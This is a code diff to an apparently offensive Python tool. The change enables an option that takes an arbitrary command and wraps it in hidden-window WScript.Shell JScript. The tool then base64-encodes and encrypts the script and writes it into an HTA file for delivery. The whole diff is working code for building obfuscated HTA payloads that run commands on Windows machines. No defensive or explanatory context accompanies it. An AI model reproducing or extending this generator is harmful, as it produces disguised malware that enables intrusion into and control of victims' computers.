@@ -92,19 +92,21 @@ def Main():
         print("[*] Written test.hta")
 
     elif option == 2:
-        # print("[*] Type your code... ")
-        # cmd = input("> ")
-        # payload = f"""
-        # a=new ActiveXObject("WScript.Shell");
-        # a.run("{cmd}", 0);window.close();
-        # """.encode()
-        # bpayload = base64.b64encode(payload)
-        # final = encrypt(bpayload)
-        # f = open('test.hta', 'w')
-        # f.write(body(final))
-        # f.close()
-        # print("[*] Written test.hta")
-        print("Not done yet!")
+        print("[*] Type your code... ")
+        print("")
+        cmd = input("> ")
+        cmd = cmd.replace("\\" , "\\\\")
+        cmd = f"cmd.exe /c {cmd}"
+        payload = f"""
+        a=new ActiveXObject("WScript.Shell");
+        a.run("{cmd}", 0);window.close();
+        """.encode()
+        bpayload = base64.b64encode(payload)
+        final = encrypt(bpayload)
+        f = open('test.hta', 'w')
+        f.write(body(final))
+        f.close()
+        print("[*] Written test.hta")
 
     else:
         sys.exit("Invalid")
